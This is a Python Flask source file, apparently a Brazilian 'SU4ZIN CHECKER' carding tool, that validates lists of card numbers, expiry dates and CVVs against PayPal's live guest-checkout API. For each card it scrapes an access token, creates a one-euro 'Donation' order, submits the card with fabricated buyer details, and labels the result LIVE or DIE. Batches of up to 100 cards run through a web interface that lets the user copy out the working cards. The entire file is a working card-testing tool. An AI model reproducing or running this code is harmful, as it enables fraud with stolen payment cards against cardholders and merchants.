from flask import Flask, render_template_string, request, jsonify
import requests
import random
import re
import os
import time

app = Flask(__name__)

# ============================================
# FUNÇÕES DA API PAYPAL
# ============================================

def getStr(string, start, end):
    """Extrai texto entre dois delimitadores"""
    try:
        return string.split(start)[1].split(end)[0]
    except:
        return ''

def deletarCookies():
    """Remove arquivo de cookies"""
    if os.path.exists("cookies.txt"):
        os.remove("cookies.txt")

def validar_cartao(cc, mes, ano, cvv):
    """Valida cartão via API do PayPal"""
    
    deletarCookies()
    
    # Ajusta formato do mês
    if len(mes) == 1:
        mes = "0" + mes
    
    # Ajusta formato do ano
    ano_map = {
        2024: "24", 2025: "25", 2026: "26", 2027: "27", 2028: "28",
        2029: "29", 2030: "30", 2031: "31", 2032: "32", 2033: "33",
        2034: "34", 2035: "35", 2036: "36", 2037: "37", 2038: "38", 2039: "39"
    }
    if ano in ano_map:
        ano = ano_map[ano]
    else:
        ano = str(ano)[-2:]
    
    # Identifica bandeira
    digito = cc[0]
    if digito == '4':
        bandeira = 'VISA'
    elif digito == '5' or digito == '2':
        bandeira = 'MASTER_CARD'
    elif digito == '6':
        bandeira = 'DISCOVER'
    elif digito == '3':
        bandeira = 'AMEX'
    else:
        bandeira = 'UNKNOWN'
    
    email = f"r4in{random.randint(10, 100000)}@gmail.com"
    
    # HEADERS
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36'
    }
    
    session = requests.Session()
    
    # PRIMEIRA REQUISIÇÃO - Pegar token
    try:
        url1 = 'https://www.paypal.com/smart/buttons?style.layout=vertical&style.color=gold&style.shape=rect&style.tagline=false&style.menuPlacement=below&fundingSource=paypal&allowBillingPayments=true&applePaySupport=false&buttonSessionID=uid_492a535db5_mty6mjg6nde&customerId=&clientID=AXvC3Esmc176nITd8oIUiVWMG0c6n-VJnJPcIaVSE-t1I-Qnulxu4OHCwDN80h_kF-NcZnK3Ai0LRxHR&clientMetadataID=uid_1a960bc26e_mty6mjg6nde&commit=true&components.0=buttons&components.1=funding-eligibility&currency=USD&debug=false&disableSetCookie=true&enableFunding.0=paylater&enableFunding.1=venmo&env=production&experiment.enableVenmo=false&experiment.venmoVaultWithoutPurchase=false&experiment.venmoWebEnabled=false&experiment.isPaypalRebrandEnabled=false&experiment.defaultBlueButtonColor=gold&experiment.venmoEnableWebOnNonNativeBrowser=false&flow=purchase&fundingEligibility=eyJwYXlwYWwiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sInBheWxhdGVyIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjpmYWxzZSwicHJvZHVjdHMiOnsicGF5SW4zIjp7ImVsaWdpYmxlIjpmYWxzZSwidmFyaWFudCI6bnVsbH0sInBheUluNCI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhcmlhbnQiOm51bGx9LCJwYXlsYXRlciI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhcmlhbnQiOm51bGx9fX0sImNhcmQiOnsiZWxpZ2libGUiOnRydWUsImJyYW5kZWQiOnRydWUsImluc3RhbGxtZW50cyI6ZmFsc2UsInZlbmRvcnMiOnsidmlzYSI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjp0cnVlfSwibWFzdGVyY2FyZCI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjp0cnVlfSwiYW1leCI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjp0cnVlfSwiZGlzY292ZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOnRydWV9LCJoaXBlciI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjpmYWxzZX0sImVsbyI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjp0cnVlfSwiamNiIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfSwibWFlc3RybyI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjp0cnVlfSwiZGluZXJzIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJjdXAiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOnRydWV9LCJjYl9uYXRpb25hbGUiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOnRydWV9fSwiZ3Vlc3RFbmFibGVkIjp0cnVlfSwidmVubW8iOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOmZhbHNlfSwiaXRhdSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJjcmVkaXQiOnsiZWxpZ2libGUiOmZhbHNlfSwiYXBwbGVwYXkiOnsiZWxpZ2libGUiOmZhbHNlfSwic2VwYSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJpZGVhbCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJiYW5jb250YWN0Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImdpcm9wYXkiOnsiZWxpZ2libGUiOmZhbHNlfSwiZXBzIjp7ImVsaWdpYmxlIjpmYWxzZX0sInNvZm9ydCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJteWJhbmsiOnsiZWxpZ2libGUiOmZhbHNlfSwicDI0Ijp7ImVsaWdpYmxlIjpmYWxzZX0sIndlY2hhdHBheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJwYXl1Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImJsaWsiOnsiZWxpZ2libGUiOmZhbHNlfSwidHJ1c3RseSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJveHhvIjp7ImVsaWdpYmxlIjpmYWxzZX0sImJvbGV0byI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJib2xldG9iYW5jYXJpbyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJtZXJjYWRvcGFnbyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJtdWx0aWJhbmNvIjp7ImVsaWdpYmxlIjpmYWxzZX0sInNhdGlzcGF5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sInBhaWR5Ijp7ImVsaWdpYmxlIjpmYWxzZX19&intent=capture&locale.country=US&locale.lang=en&merchantID.0=KZTE6QC49FDL8&hasShippingCallback=false&platform=desktop&renderedButtons.0=paypal&sessionID=uid_1a960bc26e_mty6mjg6nde&sdkCorrelationID=prebuild&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVh2QzNFc21jMTc2bklUZDhvSVVpVldNRzBjNm4tVkpuSlBjSWFWU0UtdDFJLVFudWx4dTRPSEN3RE44MGhfa0YtTmNabkszQWkwTFJ4SFImY3VycmVuY3k9VVNEJmVuYWJsZS1mdW5kaW5nPXBheWxhdGVyLHZlbm1vJm1lcmNoYW50LWlkPUtaVEU2UUM0OUZETDgmY29tcG9uZW50cz1mdW5kaW5nLWVsaWdpYmlsaXR5LGJ1dHRvbnMiLCJhdHRycyI6eyJkYXRhLXNkay1pbnRlZ3JhdGlvbi1zb3VyY2UiOiJyZWFjdC1wYXlwYWwtanMiLCJkYXRhLXVpZCI6InVpZF9qaG5iZHZ0anFzZXF4bnZkdGxibHdlY2t5Y2VvcmIifX0&sdkVersion=5.0.474&storageID=uid_fd4b7e505d_mty6mjg2mde&supportedNativeBrowser=false&supportsPopups=true&vault=false'
        
        res1 = session.get(url1, headers=headers, verify=False)
        token = getStr(res1.text, 'facilitatorAccessToken":"', '"')
        
        # SEGUNDA REQUISIÇÃO - Criar ordem
        url2 = 'https://www.paypal.com/v2/checkout/orders'
        headers2 = {
            'User-Agent': headers['User-Agent'],
            'Content-Type': 'application/json',
            'Authorization': f'Bearer {token}'
        }
        data2 = '{"purchase_units":[{"amount":{"value":1,"currency_code":"EUR"},"description":"Donation"}],"application_context":{"shipping_preference":"NO_SHIPPING"},"intent":"CAPTURE"}'
        
        res2 = session.post(url2, headers=headers2, data=data2, verify=False)
        orderId = getStr(res2.text, '"id":"', '"')
        
        # TERCEIRA REQUISIÇÃO - Validar cartão
        url3 = 'https://www.paypal.com/graphql?fetch_credit_form_submit'
        headers3 = {
            'User-Agent': headers['User-Agent'],
            'Content-Type': 'application/json',
            'Paypal-Client-Context': orderId,
            'Paypal-Client-Metadata-Id': orderId,
            'x-requested-with': 'XMLHttpRequest',
            'X-Country': 'BR',
            'X-App-Name': 'standardcardfields'
        }
        
        data3 = f'{{"query":"mutation payWithCard($token: String!, $card: CardInput!, $phoneNumber: String, $firstName: String, $lastName: String, $billingAddress: AddressInput, $email: String, $currencyConversionType: CheckoutCurrencyConversionType, $identityDocument: IdentityDocumentInput) {{ approveGuestPaymentWithCreditCard(token: $token, card: $card, phoneNumber: $phoneNumber, firstName: $firstName, lastName: $lastName, email: $email, billingAddress: $billingAddress, currencyConversionType: $currencyConversionType, identityDocument: $identityDocument) {{ flags {{ is3DSecureRequired }} cart {{ intent cartId buyer {{ userId auth {{ accessToken }} }} returnUrl {{ href }} }} paymentContingencies {{ threeDomainSecure {{ status method redirectUrl {{ href }} parameter }} }} }} }}","variables":{{"token":"{orderId}","card":{{"cardNumber":"{cc}","type":"{bandeira}","expirationDate":"{mes}/{ano}","postalCode":"98765432","securityCode":"{cvv}","productClass":"CREDIT"}},"phoneNumber":"9876543210","firstName":"John","lastName":"Doe","billingAddress":{{"givenName":"John","familyName":"Doe","state":"SP","country":"BR","postalCode":"98765432","line1":"Rua das Flores, 542, Jardim Paulista, São Paulo","line2":"","city":"Sao Paulo"}},"email":"{email}","currencyConversionType":"VENDOR","identityDocument":{{"value":"52998224725","type":"CPF"}}}}}'
        
        res3 = session.post(url3, headers=headers3, data=data3, verify=False)
        resultado = res3.text
        
        code = getStr(resultado, '"code":"', '"')
        message = getStr(resultado, '"message":"', '"')
        
        deletarCookies()
        
        # Analisar resultado
        if 'is3DSecureRequired' in resultado:
            return f'✅ APROVADA | {cc}|{mes}|{ano}|{cvv} | Cartão vinculado.'
        elif 'INVALID_SECURITY_CODE' in resultado:
            return f'✅ APROVADA | {cc}|{mes}|{ano}|{cvv} | INVALID_SECURITY_CODE'
        elif 'INVALID_BILLING_ADDRESS' in resultado:
            return f'✅ APROVADA | {cc}|{mes}|{ano}|{cvv} | INVALID_BILLING_ADDRESS'
        elif 'INVALID_EXPIRATION' in resultado:
            return f'✅ APROVADA | {cc}|{mes}|{ano}|{cvv} | INVALID_EXPIRATION'
        elif 'RISK_DISALLOWED' in resultado:
            return f'✅ APROVADA | {cc}|{mes}|{ano}|{cvv} | RISK_DISALLOWED.'
        elif 'ISSUER_DECLINE' in resultado:
            return f'❌ REPROVADA | {cc}|{mes}|{ano}|{cvv} | Cartão recusado.'
        else:
            return f'❌ REPROVADA | {cc}|{mes}|{ano}|{cvv} | [{code}] - {message}'
            
    except Exception as e:
        deletarCookies()
        return f'❌ REPROVADA | {cc}|{mes}|{ano}|{cvv} | ERRO: {str(e)}'


# ============================================
# ROTAS DA APLICAÇÃO WEB
# ============================================

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        action = request.form.get('action')
        card_data = request.form.get('card_data')
        
        if action == 'validate_card' and card_data:
            # Processa o cartão
            parts = card_data.replace(' ', '|').replace('%20', '|').split('|')
            if len(parts) >= 4:
                cc, mes, ano, cvv = parts[0], parts[1], parts[2], parts[3]
                resultado = validar_cartao(cc, mes, ano, cvv)
                return jsonify({'resultado': resultado})
            else:
                return jsonify({'resultado': '❌ ERRO | Formato inválido'})
        
        return jsonify({'resultado': '❌ ERRO | Ação inválida'})
    
    # HTML da interface
    return render_template_string(HTML_TEMPLATE)


# ============================================
# TEMPLATE HTML
# ============================================

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SU4ZIN CHECKER - PayPal Validator</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1400px;
            margin: 0 auto;
        }
        .header {
            text-align: center;
            margin-bottom: 30px;
            animation: fadeInDown 0.8s ease;
        }
        .header h1 {
            font-size: 3rem;
            font-weight: bold;
            background: linear-gradient(135deg, #ffd700, #ff8c00);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
        .gate-card {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 20px;
            margin-bottom: 30px;
            border: 1px solid rgba(255, 255, 255, 0.2);
            transition: all 0.3s ease;
        }
        .gate-card:hover {
            transform: translateY(-5px);
            border-color: #ffd700;
        }
        .gate-title {
            font-size: 1.5rem;
            font-weight: bold;
            color: #ffd700;
            margin-bottom: 20px;
            border-left: 4px solid #ffd700;
            padding-left: 15px;
        }
        .form-control {
            background: rgba(0, 0, 0, 0.5);
            border: 1px solid rgba(255, 255, 255, 0.2);
            color: #fff;
            border-radius: 10px;
            font-family: monospace;
        }
        .form-control:focus {
            background: rgba(0, 0, 0, 0.7);
            border-color: #ffd700;
            box-shadow: 0 0 10px rgba(255, 215, 0, 0.3);
            color: #fff;
        }
        .btn-checker {
            background: linear-gradient(135deg, #ffd700, #ff8c00);
            border: none;
            padding: 12px 30px;
            font-weight: bold;
            border-radius: 10px;
            color: #1a1a2e;
            transition: all 0.3s ease;
        }
        .btn-checker:hover:not(:disabled) {
            transform: scale(1.05);
            box-shadow: 0 5px 20px rgba(255, 215, 0, 0.4);
        }
        .btn-checker:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 20px;
            margin-bottom: 30px;
        }
        .stat-card {
            background: rgba(15, 15, 25, 0.6);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 20px;
            text-align: center;
            border: 1px solid rgba(255, 215, 0, 0.2);
        }
        .stat-value {
            font-size: 32px;
            font-weight: bold;
            color: #ffd700;
        }
        .stat-label {
            font-size: 12px;
            color: #888;
            margin-top: 5px;
        }
        .results-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
        }
        .result-panel {
            background: rgba(15, 15, 25, 0.6);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            overflow: hidden;
            border: 1px solid rgba(255, 215, 0, 0.2);
        }
        .panel-header {
            padding: 15px 20px;
            font-weight: bold;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid rgba(255, 215, 0, 0.2);
        }
        .panel-header.live {
            background: linear-gradient(90deg, rgba(0, 255, 0, 0.1), transparent);
            color: #0f0;
        }
        .panel-header.die {
            background: linear-gradient(90deg, rgba(255, 0, 0, 0.1), transparent);
            color: #f00;
        }
        .panel-content {
            max-height: 400px;
            overflow-y: auto;
            padding: 15px;
        }
        .result-line {
            padding: 8px 12px;
            margin-bottom: 8px;
            background: rgba(0, 0, 0, 0.5);
            border-radius: 8px;
            font-family: monospace;
            font-size: 11px;
            word-break: break-all;
            border-left: 3px solid;
        }
        .result-line.live {
            border-left-color: #0f0;
            color: #0f0;
        }
        .result-line.die {
            border-left-color: #f00;
            color: #f99;
        }
        .empty-state {
            text-align: center;
            padding: 40px;
            color: #666;
        }
        .loading-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.9);
            z-index: 9999;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }
        .loading-overlay.active {
            display: flex;
        }
        .spinner {
            width: 50px;
            height: 50px;
            border: 3px solid #ffd700;
            border-top-color: transparent;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .progress-info {
            margin-top: 15px;
            color: #ffd700;
            font-family: monospace;
        }
        .btn-group {
            margin-top: 15px;
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
        }
        .btn-secondary {
            padding: 10px 20px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-weight: bold;
        }
        @keyframes fadeInDown {
            from {
                opacity: 0;
                transform: translateY(-30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        textarea {
            resize: vertical;
            font-family: monospace;
        }
    </style>
</head>
<body>

<div class="loading-overlay" id="loading">
    <div class="spinner"></div>
    <div class="progress-info" id="progressInfo">Validando cartões...</div>
</div>

<div class="container">
    <div class="header">
        <h1><i class="fas fa-shield-alt"></i> SU4ZIN CHECKER</h1>
        <p>PayPal Card Validator | Python + Flask</p>
    </div>

    <div class="gate-card">
        <div class="gate-title">
            <i class="fas fa-credit-card"></i> GATEWAY: PAYPAL API
        </div>
        
        <textarea class="form-control" id="cardList" rows="6" placeholder="Exemplo:&#10;4111111111111111|12|2032|123&#10;5111111111111118|10|2032|456"></textarea>
        
        <div class="btn-group">
            <button class="btn-checker" id="startBtn">
                <i class="fas fa-play"></i> INICIAR VALIDAÇÃO
            </button>
            <button class="btn-secondary" id="clearBtn" style="background:rgba(255,0,0,0.5); color:#fff;">
                <i class="fas fa-trash"></i> LIMPAR TUDO
            </button>
            <button class="btn-secondary" id="copyLiveBtn" style="background:rgba(0,255,0,0.2); color:#0f0;">
                <i class="fas fa-copy"></i> COPIAR LIVES
            </button>
            <button class="btn-secondary" id="copyDieBtn" style="background:rgba(255,0,0,0.2); color:#f00;">
                <i class="fas fa-copy"></i> COPIAR DIES
            </button>
        </div>
    </div>

    <div class="stats-grid">
        <div class="stat-card">
            <div class="stat-value" id="liveCount">0</div>
            <div class="stat-label">APROVADOS (LIVE)</div>
        </div>
        <div class="stat-card">
            <div class="stat-value" id="dieCount">0</div>
            <div class="stat-label">REPROVADOS (DIE)</div>
        </div>
        <div class="stat-card">
            <div class="stat-value" id="totalCount">0</div>
            <div class="stat-label">TOTAL PROCESSADO</div>
        </div>
        <div class="stat-card">
            <div class="stat-value" id="successRate">0%</div>
            <div class="stat-label">TAXA DE SUCESSO</div>
        </div>
    </div>

    <div class="results-grid">
        <div class="result-panel">
            <div class="panel-header live">
                <span><i class="fas fa-check-circle"></i> APROVADOS (LIVE)</span>
                <span id="liveBadge">0</span>
            </div>
            <div class="panel-content" id="liveResults">
                <div class="empty-state">Nenhum cartão aprovado ainda</div>
            </div>
        </div>
        <div class="result-panel">
            <div class="panel-header die">
                <span><i class="fas fa-times-circle"></i> REPROVADOS (DIE)</span>
                <span id="dieBadge">0</span>
            </div>
            <div class="panel-content" id="dieResults">
                <div class="empty-state">Nenhum cartão reprovado ainda</div>
            </div>
        </div>
    </div>
</div>

<script>
let isProcessing = false;
let currentCards = [];
let liveResults = [];
let dieResults = [];
let currentIndex = 0;

function updateUI() {
    document.getElementById('liveCount').innerText = liveResults.length;
    document.getElementById('dieCount').innerText = dieResults.length;
    document.getElementById('totalCount').innerText = liveResults.length + dieResults.length;
    let total = liveResults.length + dieResults.length;
    let rate = total > 0 ? ((liveResults.length / total) * 100).toFixed(1) : 0;
    document.getElementById('successRate').innerText = rate + '%';
    document.getElementById('liveBadge').innerText = liveResults.length;
    document.getElementById('dieBadge').innerText = dieResults.length;
    
    let liveDiv = document.getElementById('liveResults');
    if (liveResults.length === 0) {
        liveDiv.innerHTML = '<div class="empty-state">Nenhum cartão aprovado</div>';
    } else {
        liveDiv.innerHTML = liveResults.map(r => `<div class="result-line live">${escapeHtml(r)}</div>`).join('');
    }
    
    let dieDiv = document.getElementById('dieResults');
    if (dieResults.length === 0) {
        dieDiv.innerHTML = '<div class="empty-state">Nenhum cartão reprovado</div>';
    } else {
        dieDiv.innerHTML = dieResults.map(r => `<div class="result-line die">${escapeHtml(r)}</div>`).join('');
    }
}

function escapeHtml(text) {
    let div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

async function validateCard(card) {
    try {
        let formData = new FormData();
        formData.append('action', 'validate_card');
        formData.append('card_data', card);
        
        let response = await fetch('/', {
            method: 'POST',
            body: formData
        });
        
        let data = await response.json();
        let result = data.resultado;
        
        if (result.includes('✅ APROVADA')) {
            liveResults.push(result);
        } else {
            dieResults.push(result);
        }
        updateUI();
        return result;
    } catch (error) {
        dieResults.push(card + ' | ERRO: Falha na conexão');
        updateUI();
        return 'ERROR';
    }
}

async function processQueue() {
    if (!isProcessing) return;
    if (currentIndex >= currentCards.length) {
        finishProcessing();
        return;
    }
    
    let card = currentCards[currentIndex];
    currentIndex++;
    document.getElementById('progressInfo').innerHTML = `Validando cartão ${currentIndex} de ${currentCards.length}<br>${card}`;
    
    await validateCard(card);
    
    if (isProcessing && currentIndex < currentCards.length) {
        setTimeout(processQueue, 1500);
    } else if (currentIndex >= currentCards.length) {
        finishProcessing();
    }
}

function startProcessing() {
    let cardList = document.getElementById('cardList').value.trim();
    if (!cardList) {
        alert('Por favor, insira os cartões para validar!');
        return;
    }
    
    currentCards = cardList.split('\\n').filter(line => line.trim() && line.includes('|'));
    
    if (currentCards.length === 0) {
        alert('Formato inválido! Use: numero|mes|ano|cvv');
        return;
    }
    
    if (currentCards.length > 100) {
        alert('Máximo de 100 cartões por vez!');
        return;
    }
    
    isProcessing = true;
    currentIndex = 0;
    liveResults = [];
    dieResults = [];
    updateUI();
    
    document.getElementById('startBtn').disabled = true;
    document.getElementById('loading').classList.add('active');
    
    processQueue();
}

function finishProcessing() {
    isProcessing = false;
    document.getElementById('startBtn').disabled = false;
    document.getElementById('loading').classList.remove('active');
    alert(`✅ VALIDAÇÃO CONCLUÍDA!\\n🟢 APROVADOS: ${liveResults.length}\\n🔴 REPROVADOS: ${dieResults.length}`);
}

function clearAll() {
    if (isProcessing) {
        alert('Aguarde a validação terminar!');
        return;
    }
    document.getElementById('cardList').value = '';
    liveResults = [];
    dieResults = [];
    currentCards = [];
    currentIndex = 0;
    updateUI();
}

function copyLives() {
    if (liveResults.length === 0) {
        alert('Nenhum cartão aprovado para copiar!');
        return;
    }
    navigator.clipboard.writeText(liveResults.join('\\n'));
    alert(`✅ ${liveResults.length} cartões aprovados copiados!`);
}

function copyDies() {
    if (dieResults.length === 0) {
        alert('Nenhum cartão reprovado para copiar!');
        return;
    }
    navigator.clipboard.writeText(dieResults.join('\\n'));
    alert(`❌ ${dieResults.length} cartões reprovados copiados!`);
}

document.getElementById('startBtn').addEventListener('click', startProcessing);
document.getElementById('clearBtn').addEventListener('click', clearAll);
document.getElementById('copyLiveBtn').addEventListener('click', copyLives);
document.getElementById('copyDieBtn').addEventListener('click', copyDies);

if (!document.getElementById('cardList').value) {
    document.getElementById('cardList').value = '4111111111111111|12|2032|123\\n5111111111111118|10|2032|456';
}
</script>
</body>
</html>
'''

if __name__ == '__main__':
    # Desabilitar verificação SSL para evitar erros
    import ssl
    ssl._create_default_https_context = ssl._create_unverified_context
    
    app.run(host='0.0.0.0', port=5000, debug=True)